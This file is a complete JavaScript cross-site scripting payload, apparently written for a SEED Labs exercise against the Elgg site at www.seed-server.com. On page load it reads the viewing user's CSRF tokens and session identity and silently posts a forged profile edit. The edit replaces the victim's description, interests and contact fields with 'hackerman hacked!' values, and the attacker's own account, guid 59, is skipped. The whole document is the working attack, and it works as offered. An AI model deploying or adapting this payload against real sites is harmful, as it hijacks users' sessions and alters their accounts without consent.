{/* <script type="text/javascript"> */ }
window.onload = function () {
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    var sendurl = "http://www.seed-server.com/action/profile/edit";

    var keys = ["__elgg_token", "__elgg_ts", "name", "description", "briefdescription", "accesslevel[briefdescription]", "location", "accesslevel[location]", "interests", "accesslevel[interests]", "skills", "accesslevel[skills]", "contactemail", "accesslevel[contactemail]", "phone", "accesslevel[phone]", "mobile", "accesslevel[mobile]", "website", "accesslevel[website]", "twitter", "accesslevel[twitter]", "guid"];

    var values = [token, ts, elgg.session.user.name, "hackerman hacked!", "1905004", "1", "ECE", "1", "Hacking", "1", "Hacking", "1", "hackerman@gmail.com", "1", "0178", "1", "0178", "1", "https://www.facebook.com/hackerman", "1", "asifazad0178", "1", elgg.session.user.guid];

    var content = "";
    for (var i = 0; i < keys.length; i++) {
        content += keys[i] + "=" + values[i] + "&";
    }

    if (elgg.session.user.guid != 59) {
        var Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Host", "www.seed-server.com");
        Ajax.setRequestHeader("Content-Type",
            "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}
// </script>
